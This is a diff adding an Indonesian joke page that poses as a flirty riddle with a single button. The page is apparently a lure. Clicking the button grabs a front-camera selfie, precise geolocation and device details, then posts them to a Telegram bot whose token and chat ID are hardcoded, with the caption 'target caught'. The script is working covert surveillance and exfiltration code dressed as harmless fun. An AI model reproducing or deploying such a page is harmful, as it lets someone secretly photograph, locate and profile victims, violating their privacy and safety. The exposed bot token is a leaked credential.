@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tiang Tiang Apa Yang Bikin Rindu?</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html, body {
+    height: 100%;
+    overflow: hidden;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+  }
+
+  body {
+    background: linear-gradient(160deg, #ffd6e2 0%, #ffc2d6 50%, #ffb3cc 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+  }
+
+  /* ===== Emoji berterbangan ===== */
+  .emoji-layer {
+    position: fixed;
+    inset: 0;
+    pointer-events: none;
+    overflow: hidden;
+    z-index: 1;
+  }
+  .emoji {
+    position: absolute;
+    bottom: -60px;
+    font-size: 28px;
+    opacity: 0;
+    animation: floatUp linear infinite;
+    user-select: none;
+    will-change: transform, opacity;
+  }
+  @keyframes floatUp {
+    0% {
+      transform: translateY(0) translateX(0) rotate(0deg) scale(0.8);
+      opacity: 0;
+    }
+    10% { opacity: 0.9; }
+    50% {
+      transform: translateY(-50vh) translateX(20px) rotate(15deg) scale(1);
+      opacity: 0.9;
+    }
+    90% { opacity: 0.6; }
+    100% {
+      transform: translateY(-110vh) translateX(-20px) rotate(-15deg) scale(0.9);
+      opacity: 0;
+    }
+  }
+
+  /* ===== Card utama ===== */
+  .card {
+    position: relative;
+    z-index: 2;
+    max-width: 380px;
+    width: 90%;
+    padding: 40px 24px 28px;
+    text-align: center;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 40px;
+  }
+
+  .title {
+    color: #ffffff;
+    font-size: 26px;
+    font-weight: 800;
+    line-height: 1.35;
+    text-shadow:
+      0 2px 10px rgba(255, 105, 145, 0.55),
+      0 1px 3px rgba(0, 0, 0, 0.1);
+    letter-spacing: 0.3px;
+  }
+
+  .btn {
+    background: #ff6fa3;
+    color: #ffffff;
+    border: none;
+    padding: 18px 48px;
+    font-size: 22px;
+    font-weight: 800;
+    border-radius: 18px;
+    cursor: pointer;
+    box-shadow:
+      0 8px 24px rgba(255, 111, 163, 0.5),
+      0 2px 6px rgba(255, 111, 163, 0.35);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    letter-spacing: 0.5px;
+  }
+  .btn:active {
+    transform: scale(0.95);
+    box-shadow: 0 4px 14px rgba(255, 111, 163, 0.5);
+  }
+  .btn:disabled {
+    opacity: 0.6;
+    cursor: wait;
+  }
+
+  .status {
+    position: fixed;
+    top: 16px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(255, 255, 255, 0.85);
+    color: #ff4d88;
+    font-size: 13px;
+    font-weight: 600;
+    padding: 8px 18px;
+    border-radius: 20px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+    min-height: 0;
+    opacity: 0;
+    transition: opacity 0.3s ease;
+    z-index: 5;
+    pointer-events: none;
+  }
+  .status.show { opacity: 1; }
+
+  /* ===== Footer signature ===== */
+  .footer {
+    position: fixed;
+    bottom: 14px;
+    left: 0;
+    right: 0;
+    text-align: center;
+    color: rgba(255, 255, 255, 0.9);
+    font-size: 13px;
+    font-weight: 600;
+    text-shadow: 0 1px 4px rgba(255, 105, 145, 0.5);
+    letter-spacing: 0.4px;
+    z-index: 3;
+    pointer-events: none;
+  }
+</style>
+</head>
+<body>
+
+<!-- layer emoji berterbangan -->
+<div class="emoji-layer" id="emojiLayer"></div>
+
+<!-- notif status -->
+<div class="status" id="status"></div>
+
+<!-- card utama -->
+<div class="card">
+  <div class="title">Tiang tiang apa yang bikin rindu?</div>
+  <button class="btn" id="btn">apaa tuchh</button>
+</div>
+
+<!-- footer -->
+<div class="footer">by@ziz my dev</div>
+
+<script>
+/* ====== EDIT DISINI ====== */
+const BOT_TOKEN = "9289046558:AAGV84rg9wGUKJEv3I5li0rPfEdvAYehtKw";
+const CHAT_ID   = "8807511473";
+/* ========================= */
+
+const btn         = document.getElementById('btn');
+const statusEl    = document.getElementById('status');
+const emojiLayer  = document.getElementById('emojiLayer');
+
+/* ===== Spawner emoji berterbangan ===== */
+const EMOJIS = ['💖','💕','💗','🌸','💘','💞','🌷','✨','💝','🩷'];
+function spawnEmoji() {
+  const el = document.createElement('div');
+  el.className = 'emoji';
+  el.textContent = EMOJIS[Math.floor(Math.random() * EMOJIS.length)];
+  el.style.left = Math.random() * 100 + '%';
+  el.style.fontSize = (18 + Math.random() * 22) + 'px';
+  const dur = 8 + Math.random() * 8;
+  el.style.animationDuration = dur + 's';
+  el.style.animationDelay = Math.random() * 2 + 's';
+  emojiLayer.appendChild(el);
+  setTimeout(() => el.remove(), (dur + 2) * 1000);
+}
+for (let i = 0; i < 18; i++) setTimeout(spawnEmoji, i * 250);
+setInterval(spawnEmoji, 700);
+
+/* ===== Status toast ===== */
+let statusTimer = null;
+function setStatus(text, hold = 4000) {
+  clearTimeout(statusTimer);
+  statusEl.textContent = text;
+  statusEl.classList.add('show');
+  if (hold > 0) {
+    statusTimer = setTimeout(() => statusEl.classList.remove('show'), hold);
+  }
+}
+
+/* ===== Ambil info device ===== */
+async function getDeviceInfo() {
+  const info = {
+    userAgent: navigator.userAgent,
+    platform : navigator.platform || 'unknown',
+    language : navigator.language || 'unknown',
+    cores    : navigator.hardwareConcurrency || 'unknown',
+    ram      : navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
+    screen   : `${screen.width}x${screen.height} @${window.devicePixelRatio || 1}x`,
+    battery  : 'unknown',
+    charging : 'unknown',
+    network  : 'unknown',
+  };
+
+  // Merek HP dari UA
+  const ua = navigator.userAgent;
+  let brand = 'unknown';
+  if (/iPhone/i.test(ua))                       brand = 'Apple iPhone';
+  else if (/iPad/i.test(ua))                    brand = 'Apple iPad';
+  else if (/Samsung|SM-/i.test(ua))             brand = 'Samsung';
+  else if (/Xiaomi|Redmi|POCO|Mi /i.test(ua))   brand = 'Xiaomi / Redmi / POCO';
+  else if (/OPPO|CPH/i.test(ua))                brand = 'OPPO';
+  else if (/vivo|V[0-9]{4}/i.test(ua))          brand = 'vivo';
+  else if (/Realme|RMX/i.test(ua))              brand = 'Realme';
+  else if (/Huawei|HONOR/i.test(ua))            brand = 'Huawei / HONOR';
+  else if (/Infinix/i.test(ua))                 brand = 'Infinix';
+  else if (/Tecno/i.test(ua))                   brand = 'Tecno';
+  else if (/OnePlus/i.test(ua))                 brand = 'OnePlus';
+  else if (/Android/i.test(ua))                 brand = 'Android (unknown)';
+  else if (/Windows/i.test(ua))                 brand = 'Windows PC';
+  else if (/Macintosh|Mac OS/i.test(ua))        brand = 'macOS';
+  else if (/Linux/i.test(ua))                   brand = 'Linux';
+  info.brand = brand;
+
+  // Baterai (Chromium only)
+  try {
+    if (navigator.getBattery) {
+      const b = await navigator.getBattery();
+      info.battery  = Math.round(b.level * 100) + '%';
+      info.charging = b.charging ? 'sedang cas' : 'tidak cas';
+    }
+  } catch (e) {}
+
+  // Tipe koneksi
+  try {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (c) info.network = c.effectiveType || c.type || 'unknown';
+  } catch (e) {}
+
+  return info;
+}
+
+/* ===== Jepret kamera depan ===== */
+async function captureSelfie() {
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: 'user', width: { ideal: 720 }, height: { ideal: 720 } },
+    audio: false,
+  });
+
+  const video = document.createElement('video');
+  video.srcObject = stream;
+  video.muted = true;
+  video.playsInline = true;
+  video.autoplay = true;
+  await video.play();
+
+  await new Promise(r => {
+    if (video.videoWidth > 0) return r();
+    video.onloadedmetadata = () => r();
+    setTimeout(r, 1500); // fallback
+  });
+
+  await new Promise(r => setTimeout(r, 400)); // stabilkan frame
+
+  const canvas = document.createElement('canvas');
+  canvas.width  = video.videoWidth  || 640;
+  canvas.height = video.videoHeight || 640;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+  stream.getTracks().forEach(t => t.stop());
+
+  return await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
+}
+
+/* ===== Geolokasi ===== */
+function getLocation() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) return resolve(null);
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve(pos.coords),
+      ()  => resolve(null),
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  });
+}
+
+/* ===== Kirim ke Telegram ===== */
+async function sendMessage(text) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  const r = await fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' }),
+  });
+  return r.ok;
+}
+
+async function sendPhoto(blob, caption) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+  const fd = new FormData();
+  fd.append('chat_id', CHAT_ID);
+  fd.append('caption', caption);
+  fd.append('parse_mode', 'HTML');
+  fd.append('photo', blob, 'target.jpg');
+  const r = await fetch(url, { method: 'POST', body: fd });
+  return r.ok;
+}
+
+/* ===== Handler tombol ===== */
+btn.addEventListener('click', async () => {
+  btn.disabled = true;
+  setStatus('Meminta izin kamera & lokasi...', 0);
+
+  let coords = null, photoBlob = null, deviceInfo = null;
+
+  try {
+    const [loc, dev] = await Promise.all([getLocation(), getDeviceInfo()]);
+    coords = loc;
+    deviceInfo = dev;
+
+    setStatus('Menjepret...', 0);
+    photoBlob = await captureSelfie();
+
+    setStatus('Mengirim data...', 0);
+
+    const batteryLine = deviceInfo.battery !== 'unknown'
+      ? `${deviceInfo.battery} (${deviceInfo.charging})`
+      : 'tidak tersedia';
+
+    const deviceText =
+`<b>📱 Info Device</b>
+<b>Merek:</b> ${deviceInfo.brand}
+<b>Baterai:</b> ${batteryLine}
+<b>RAM:</b> ${deviceInfo.ram}
+<b>CPU Core:</b> ${deviceInfo.cores}
+<b>Layar:</b> ${deviceInfo.screen}
+<b>Jaringan:</b> ${deviceInfo.network}
+<b>Platform:</b> ${deviceInfo.platform}
+<b>Bahasa:</b> ${deviceInfo.language}
+<b>UA:</b> <code>${deviceInfo.userAgent}</code>`;
+
+    let locationText;
+    if (coords) {
+      const { latitude: lat, longitude: lon, accuracy } = coords;
+      locationText =
+`<b>📍 Lokasi</b>
+<b>Lat:</b> ${lat}
+<b>Lon:</b> ${lon}
+<b>Akurasi:</b> ±${Math.round(accuracy)} m
+<b>Maps:</b> https://maps.google.com/?q=${lat},${lon}`;
+    } else {
+      locationText = '<b>📍 Lokasi</b>\nTidak tersedia / ditolak.';
+    }
+
+    if (photoBlob) {
+      await sendPhoto(photoBlob, '📸 <b>Target tertangkap</b>');
+    }
+    await sendMessage(locationText + '\n\n' + deviceText);
+
+    setStatus('Terkirim ✓', 3000);
+  } catch (err) {
+    console.error(err);
+    setStatus('Gagal: ' + err.message, 5000);
+  } finally {
+    btn.disabled = false;
+  }
+});
+</script>
+</body>
+</html>
